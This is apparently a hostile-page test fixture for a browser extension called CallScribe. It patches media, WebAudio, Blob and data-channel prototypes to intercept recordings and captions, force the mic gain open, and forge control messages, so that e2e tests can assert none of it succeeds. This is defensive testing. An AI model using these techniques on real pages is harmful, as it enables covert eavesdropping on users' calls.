// Hostile page script for the e2e fixtures. The test servers inline it as the FIRST <script>
// in <head>, so it is the earliest page code there can be. It tries to obtain CallScribe's
// private page<->extension channel, read the recording and captions going over it, and forge
// extension<->MAIN-world messages (audio chunks, captions, stop, mic on, keepalive, dc-send).
// Everything it manages to see is counted in window.__atk; the e2e asserts it all stays zero
// and that the forged messages change nothing. window.__attack(id) re-runs the forgeries,
// with a session id the harness hands it (as if it had leaked).
// It also goes after CallScribe's objects (Task 1 review C1, I1, I2): it patches the
// MediaRecorder, WebAudio, Blob/FileReader and RTCDataChannel/MessageEvent prototypes to catch
// any recorder, graph node or param that isn't the page's own, then reads the caught recorder's
// chunks, dispatches forged dataavailable/stop events on it, forces the caught mic gain open,
// and dispatches forged open/message events (real captions_v2 frames) on data channels.
// atk.hooked lists the patches installed and atk.selfTest counts each one firing on the
// attacker's own objects, so the e2e can tell "nothing caught" from "patch never ran".
// Against the code of commit 2c8662b (before the fix) these routes worked; see the Task 1
// report, "Fix round 1", for that positive-control run.
;(function () {
  "use strict"
  const atk = (window.__atk = {
    messages: 0, // window messages carrying __callscribe data
    audioBytes: 0, // ArrayBuffer bytes seen in any intercepted CallScribe traffic
    sessionIds: [], // CallScribe session ids seen anywhere
    ports: 0, // MessagePorts obtained
    nodes: 0, // CallScribe channel endpoints (non-DOM event targets) obtained
    nodeEvents: 0, // events received on the attacker's own fake channel endpoint
    detailReads: 0, // CallScribe CustomEvent details intercepted
    protoHits: 0, // CallScribe objects caught through Object.prototype getters
    blobReads: 0, // audio Blobs read through a patched Blob.prototype.arrayBuffer
    forged: 0, // forgery rounds run
    recorders: 0, // CallScribe MediaRecorders caught through patched prototypes
    recChunks: 0, // real (trusted) chunks read from a caught recorder
    recForged: 0, // forged dataavailable/stop events dispatched on a caught recorder
    graphHits: 0, // calls on CallScribe's WebAudio nodes/params seen by patched prototypes
    gateForced: 0, // CallScribe gain changes the attacker turned into "open" (gain 1)
    dcReads: 0, // data-channel labels/states/message data read by someone else through patched getters
    dcForged: 0, // forged open/message events dispatched on data channels CallScribe taps
    hooked: [], // object-level patches installed
    selfTest: {}, // patch -> times it fired on the attacker's own objects (proves it is live)
    errors: [],
  })
  const mine = document.createElement("span") // the attacker's fake channel endpoint
  const NAMES = ["__callscribe_bridge", "__callscribe_to_page", "__callscribe_to_ext"]
  const ID_RE = /(slack-huddle|google-meet)-[a-z0-9]+-[a-z0-9]+/g
  const note = (v) => {
    try {
      let bytes = 0
      const walk = (x, d) => {
        if (!x || d > 3) return
        if (x instanceof ArrayBuffer) bytes += x.byteLength
        else if (ArrayBuffer.isView(x)) bytes += x.byteLength
        else if (typeof x === "object") for (const k of Object.keys(x)) walk(x[k], d + 1)
      }
      walk(v, 0)
      atk.audioBytes += bytes
      const s = JSON.stringify(v, (k, x) => (x instanceof ArrayBuffer ? "[buf]" : x)) || ""
      for (const m of s.match(ID_RE) || []) if (!atk.sessionIds.includes(m)) atk.sessionIds.push(m)
    } catch (e) {
      atk.errors.push(String(e))
    }
  }
  // The attacker's own forgeries carry __forged so they aren't counted as leaks.
  let self = 0
  const isCS = (v) => {
    try {
      if (self || !v || typeof v !== "object" || Object.prototype.hasOwnProperty.call(v, "__forged")) return false
      return "__callscribe" in v || ("type" in v && ("buf" in v || "id" in v || "on" in v))
    } catch {
      return false
    }
  }

  // --- listen: window messages (the old, public transport)
  addEventListener("message", (e) => {
    if (isCS(e.data)) {
      atk.messages++
      note(e.data)
    }
    if (e.ports && e.ports.length) atk.ports += e.ports.length
  }, true)

  // --- listen: the channel's event names, anywhere the page can reach
  for (const name of NAMES) {
    for (const t of [window, document]) t.addEventListener(name, (e) => {
      try {
        if (self) return
        if (e.relatedTarget) atk.nodes++
        if (e.detail) { atk.detailReads++; note(e.detail) }
      } catch {}
    }, true)
  }

  // --- patch: prototypes CallScribe's MAIN-world code might call later
  const P = (proto, key, wrap) => {
    try {
      const d = Object.getOwnPropertyDescriptor(proto, key)
      if (!d) return
      if (d.get) Object.defineProperty(proto, key, { ...d, get: wrap(d.get) })
      else if (typeof d.value === "function") Object.defineProperty(proto, key, { ...d, value: wrap(d.value) })
    } catch (e) {
      atk.errors.push("patch " + key + ": " + e)
    }
  }
  const pageTarget = (t) => t === window || t === document || (t instanceof Node && t.isConnected)
  P(EventTarget.prototype, "dispatchEvent", (orig) => function (ev) {
    try {
      if (!self && this !== mine && !pageTarget(this) && (NAMES.includes(ev.type) || /callscribe/i.test(ev.type))) atk.nodes++
    } catch {}
    return orig.apply(this, arguments)
  })
  P(EventTarget.prototype, "addEventListener", (orig) => function (type) {
    try {
      if (!self && this !== mine && !pageTarget(this) && (NAMES.includes(type) || /callscribe/i.test(type))) atk.nodes++
    } catch {}
    return orig.apply(this, arguments)
  })
  P(CustomEvent.prototype, "detail", (orig) => function () {
    const v = orig.call(this)
    if (isCS(v)) { atk.detailReads++; note(v) }
    return v
  })
  P(MouseEvent.prototype, "relatedTarget", (orig) => function () {
    const v = orig.call(this)
    try { if (!self && v && NAMES.includes(this.type)) atk.nodes++ } catch {}
    return v
  })
  P(MessageEvent.prototype, "ports", (orig) => function () {
    const v = orig.call(this)
    if (v && v.length) atk.ports += v.length
    return v
  })
  P(MessagePort.prototype, "postMessage", (orig) => function (m) {
    if (isCS(m)) { atk.ports++; note(m) }
    return orig.apply(this, arguments)
  })
  P(Blob.prototype, "arrayBuffer", (orig) => function () {
    try { if (/^audio\//.test(this.type)) atk.blobReads++ } catch {}
    return orig.apply(this, arguments)
  })
  // Event-init dictionaries are read property by property; with no own property the lookup
  // reaches Object.prototype, where these getters see the object being converted.
  for (const key of ["bubbles", "cancelable", "composed", "detail", "relatedTarget"]) {
    try {
      Object.defineProperty(Object.prototype, key, {
        configurable: true,
        get() {
          if (this && this !== Object.prototype) {
            const own = Object.getOwnPropertyDescriptor(this, "detail")
            if (isCS(this) || (own && isCS(own.value))) { atk.protoHits++; note(this) }
          }
          return undefined
        },
        set(v) { Object.defineProperty(this, key, { value: v, writable: true, enumerable: true, configurable: true }) },
      })
    } catch (e) {
      atk.errors.push("proto " + key + ": " + e)
    }
  }

  // --- object level: catch CallScribe's recorder, WebAudio graph and data-channel reads
  const mineObj = new WeakSet() // the attacker's own media objects (self-test)
  const pageCtx = new WeakSet() // AudioContexts the page itself made
  const foreignGain = new WeakSet() // AudioParams of gain nodes in contexts that aren't the page's
  const caught = [] // CallScribe recorders caught
  const chans = [] // data channels the page created (through CallScribe's tap when it has one)
  const nativeAdd = EventTarget.prototype.addEventListener
  const ctxOf = Object.getOwnPropertyDescriptor(AudioNode.prototype, "context").get
  const dataOf = Object.getOwnPropertyDescriptor(BlobEvent.prototype, "data").get
  const blobTypeOf = Object.getOwnPropertyDescriptor(Blob.prototype, "type").get
  const blobSizeOf = Object.getOwnPropertyDescriptor(Blob.prototype, "size").get
  const live = (name, isMine) => {
    if (self || isMine) atk.selfTest[name] = (atk.selfTest[name] || 0) + 1
    return !self && !isMine
  }
  // H(proto, key, kind, fn): wrap a method ("value"), getter ("get") or setter ("set");
  // fn(name, orig, thisArg, args) returns the result.
  const H = (C, key, kind, fn) => {
    try {
      let proto = C && C.prototype
      while (proto && !Object.getOwnPropertyDescriptor(proto, key)) proto = Object.getPrototypeOf(proto)
      if (!proto) return atk.errors.push("no " + key)
      const d = Object.getOwnPropertyDescriptor(proto, key)
      const name = C.name + (kind === "value" ? "." : "." + kind + " ") + key
      const orig = d[kind]
      if (typeof orig !== "function") return atk.errors.push("no " + name)
      Object.defineProperty(proto, key, { ...d, [kind]: function () { return fn(name, orig, this, arguments) } })
      atk.hooked.push(name)
    } catch (e) {
      atk.errors.push("hook " + key + ": " + e)
    }
  }
  function catchRecorder(r) {
    if (caught.includes(r)) return
    caught.push(r)
    atk.recorders++
    nativeAdd.call(r, "dataavailable", (e) => {
      if (!e.isTrusted) return
      atk.recChunks++
      try { atk.audioBytes += blobSizeOf.call(dataOf.call(e)) } catch {}
    })
  }
  // MediaRecorder: whoever calls these on a recorder that isn't the attacker's hands it over.
  for (const key of ["start", "stop", "pause", "resume", "requestData"]) {
    H(MediaRecorder, key, "value", (name, orig, r, args) => {
      if (live(name, mineObj.has(r))) catchRecorder(r)
      return orig.apply(r, args)
    })
  }
  H(MediaRecorder, "state", "get", (name, orig, r) => {
    if (live(name, mineObj.has(r))) catchRecorder(r)
    return orig.call(r)
  })
  // Web Audio: contexts the page didn't make are CallScribe's.
  const NativeAC = window.AudioContext
  window.AudioContext = new Proxy(NativeAC, {
    construct(t, a, nt) { const c = Reflect.construct(t, a, nt); pageCtx.add(c); return c },
  })
  const foreignCtx = (c) => c && !pageCtx.has(c) && !mineObj.has(c)
  const foreignNode = (n) => { try { return foreignCtx(ctxOf.call(n)) } catch { return false } }
  for (const key of ["createGain", "createMediaStreamSource", "createMediaStreamDestination", "createConstantSource", "resume", "close"]) {
    H(NativeAC, key, "value", (name, orig, c, args) => {
      if (live(name, mineObj.has(c)) && foreignCtx(c)) atk.graphHits++
      return orig.apply(c, args)
    })
  }
  for (const key of ["currentTime", "state"]) {
    H(NativeAC, key, "get", (name, orig, c) => {
      if (live(name, mineObj.has(c)) && foreignCtx(c)) atk.graphHits++
      return orig.call(c)
    })
  }
  for (const key of ["connect", "disconnect"]) {
    H(AudioNode, key, "value", (name, orig, n, args) => {
      if (live(name, mineObj.has(n)) && foreignNode(n)) atk.graphHits++
      return orig.apply(n, args)
    })
  }
  H(GainNode, "gain", "get", (name, orig, n) => {
    const param = orig.call(n)
    if (live(name, mineObj.has(n)) && foreignNode(n)) { atk.graphHits++; foreignGain.add(param) }
    return param
  })
  for (const [C, key] of [[ConstantSourceNode, "offset"], [MediaStreamAudioDestinationNode, "stream"]]) {
    H(C, key, "get", (name, orig, n) => {
      if (live(name, mineObj.has(n)) && foreignNode(n)) atk.graphHits++
      return orig.call(n)
    })
  }
  // The mic gate: any value CallScribe writes to a caught gain becomes 1 (open).
  H(AudioParam, "value", "set", (name, orig, prm, args) => {
    if (live(name, mineObj.has(prm)) && foreignGain.has(prm)) { atk.gateForced++; return orig.call(prm, 1) }
    return orig.apply(prm, args)
  })
  for (const key of ["setValueAtTime", "setTargetAtTime", "linearRampToValueAtTime"]) {
    H(AudioParam, key, "value", (name, orig, prm, args) => {
      if (live(name, mineObj.has(prm)) && foreignGain.has(prm)) { atk.gateForced++; return orig.apply(prm, [1, ...[...args].slice(1)]) }
      return orig.apply(prm, args)
    })
  }
  H(AudioParam, "cancelScheduledValues", "value", (name, orig, prm, args) => {
    if (live(name, mineObj.has(prm)) && foreignGain.has(prm)) atk.graphHits++
    return orig.apply(prm, args)
  })
  // Recorded audio: Blob size/type, BlobEvent data, FileReader reads of audio that isn't the attacker's.
  const audioBlob = (b) => { try { return /^audio\//.test(blobTypeOf.call(b)) && !mineObj.has(b) } catch { return false } }
  H(Blob, "size", "get", (name, orig, b) => {
    if (live(name, mineObj.has(b)) && audioBlob(b)) atk.blobReads++
    return orig.call(b)
  })
  H(BlobEvent, "data", "get", (name, orig, e) => {
    const b = orig.call(e)
    if (live(name, mineObj.has(e)) && audioBlob(b)) atk.blobReads++
    return b
  })
  H(FileReader, "readAsArrayBuffer", "value", (name, orig, fr, args) => {
    if (live(name, mineObj.has(fr)) && audioBlob(args[0])) atk.blobReads++
    return orig.apply(fr, args)
  })
  // Data channels: CallScribe's Meet tap must not read through the page's prototypes.
  for (const key of ["label", "readyState"]) {
    H(RTCDataChannel, key, "get", (name, orig, ch) => {
      if (live(name, mineObj.has(ch))) atk.dcReads++
      return orig.call(ch)
    })
  }
  H(RTCDataChannel, "send", "value", (name, orig, ch, args) => {
    if (live(name, mineObj.has(ch))) atk.dcReads++
    return orig.apply(ch, args)
  })
  H(MessageEvent, "data", "get", (name, orig, e) => {
    let isDc = false
    try { isDc = e.target instanceof RTCDataChannel } catch {}
    if (live(name, mineObj.has(e)) && isDc) atk.dcReads++
    return orig.call(e)
  })
  H(RTCPeerConnection, "createDataChannel", "value", (name, orig, pc, args) => {
    const ch = orig.apply(pc, args)
    if (live(name, mineObj.has(pc))) chans.push(ch)
    return ch
  })
  // The attacker's own data channel, as Meet's would be: CallScribe taps it (on Meet).
  try {
    new RTCPeerConnection().createDataChannel("captions_v2") // collected by the patch above
  } catch (e) {
    atk.errors.push("dc: " + e)
  }
  // Self-test: every patch must fire on the attacker's own objects, or a zero proves nothing.
  function selfTest() {
    self++
    try {
      const ctx = new NativeAC()
      mineObj.add(ctx)
      const g = ctx.createGain()
      const src = ctx.createConstantSource()
      const dst = ctx.createMediaStreamDestination()
      for (const n of [g, src, dst]) mineObj.add(n)
      const prm = g.gain
      mineObj.add(prm)
      void src.offset
      prm.value = 0
      prm.cancelScheduledValues(0)
      prm.setValueAtTime(0, 0)
      prm.setTargetAtTime(0, 0, 0.1)
      prm.linearRampToValueAtTime(0, 1)
      src.connect(g)
      g.connect(dst)
      src.disconnect()
      void ctx.currentTime
      void ctx.state
      src.start()
      mineObj.add(ctx.createMediaStreamSource(dst.stream))
      const r = new MediaRecorder(dst.stream)
      mineObj.add(r)
      nativeAdd.call(r, "dataavailable", (e) => {
        mineObj.add(e)
        const b = e.data
        mineObj.add(b)
        void b.size
        const fr = new FileReader()
        mineObj.add(fr)
        fr.readAsArrayBuffer(b)
      })
      r.start()
      r.pause()
      r.resume()
      void r.state
      r.requestData()
      setTimeout(() => { try { self++; r.stop(); ctx.resume().catch(() => {}); ctx.close().catch(() => {}) } finally { self-- } }, 300)
      const ch = new RTCPeerConnection().createDataChannel("attacker-own")
      mineObj.add(ch)
      void ch.label
      void ch.readyState
      try { ch.send("x") } catch {}
      const me = new MessageEvent("message", { data: 1 })
      void me.data
    } catch (e) {
      atk.errors.push("selfTest: " + e)
    } finally {
      self--
    }
  }
  setTimeout(selfTest, 0)
  // Forgeries on what was caught: chunks/stop on CallScribe's recorder, open/messages on channels.
  function forgeObjects() {
    // window.__atkRoutes = "gate" (set by the harness with ATTACK_ROUTES=gate) leaves a caught
    // recorder running, so a positive-control run can show the forced mic gate in the audio.
    if (window.__atkRoutes !== "gate") for (const r of caught) {
      try {
        r.dispatchEvent(new BlobEvent("dataavailable", { data: new Blob([new Uint8Array(16).fill(0x41)], { type: "audio/webm" }) }))
        r.dispatchEvent(new Event("stop"))
        atk.recForged++
      } catch (e) {
        atk.errors.push("recForge: " + e)
      }
    }
    for (const ch of chans) {
      try {
        ch.dispatchEvent(new Event("open"))
        for (const f of frames) ch.dispatchEvent(new MessageEvent("message", { data: bytes(f) }))
        atk.dcForged++
      } catch (e) {
        atk.errors.push("dcForge: " + e)
      }
    }
  }

  // --- obtain: offer our own endpoint with the channel's handshake
  for (const name of NAMES) mine.addEventListener(name, () => { if (!self) atk.nodeEvents++ })
  function offer() {
    self++
    try {
      offerAll()
    } finally {
      self--
    }
  }
  function offerAll() {
    for (const t of [window, document]) {
      try { t.dispatchEvent(new MouseEvent("__callscribe_bridge", { relatedTarget: mine })) } catch {}
    }
    for (const type of ["status", "keepalive-status", "dc-hello"]) {
      mine.dispatchEvent(new CustomEvent("__callscribe_to_page", { detail: { type, __forged: 1 } }))
    }
  }
  offer()

  // --- forge: every message type, on every route the page can reach
  const frames = window.__forgedFrames || [] // Meet: real captions_v2 frames (base64)
  const bytes = (b64) => Uint8Array.from(atob(b64), (c) => c.charCodeAt(0)).buffer
  const junk = () => new Uint8Array(16).fill(0x41).buffer
  function forge(id) {
    self++
    try {
      forgeAll(id)
    } finally {
      self--
    }
  }
  function forgeAll(id) {
    atk.forged++
    const ids = [id, "slack-huddle-x-y", "google-meet-x-y"].filter(Boolean)
    const toExt = []
    for (const i of ids) {
      toExt.push({ type: "chunk", id: i, seq: 0, mime: "audio/webm;codecs=opus", buf: junk() })
      toExt.push({ type: "chunk", id: i, seq: 999, mime: "audio/webm;codecs=opus", buf: junk() })
      toExt.push({ type: "stopped", id: i }, { type: "started", id: i }, { type: "log", id: i, message: "<b>spoofed log</b>" })
    }
    toExt.push({ type: "dc-open", label: "captions_v2" })
    for (const f of frames) toExt.push({ type: "dc-msg", label: "captions_v2", dir: "in", t: Date.now(), buf: bytes(f) })
    const toPage = [{ type: "stop" }, { type: "mic", on: true }, { type: "render-keepalive", on: false },
      { type: "dc-send", label: "captions_v2", buf: junk() }, { type: "start", id: "slack-huddle-forged-x", includeMic: true }]
    for (const i of ids) toPage.push({ type: "stop", id: i }, { type: "pause", id: i }, { type: "config", id: i, includeMic: true })
    for (const m of [...toExt, ...toPage]) m.__forged = 1
    for (const m of toExt) {
      postMessage({ __callscribe: "page", ...m }, location.origin)
      for (const t of [window, document, mine]) t.dispatchEvent(new CustomEvent("__callscribe_to_ext", { detail: m }))
    }
    for (const m of toPage) {
      postMessage({ __callscribe: "ext", ...m }, location.origin)
      for (const t of [window, document, mine]) t.dispatchEvent(new CustomEvent("__callscribe_to_page", { detail: m }))
    }
    forgeObjects()
    offer()
  }
  window.__attack = (id) => {
    try { forge(id) } catch (e) { atk.errors.push("forge: " + e) }
    return atk.forged
  }
  // Keep at it on its own too: the keepalive-off and mic-on forgeries must lose every time.
  setInterval(() => { try { forge(null) } catch (e) { atk.errors.push("forge: " + e) } }, 700)
})()
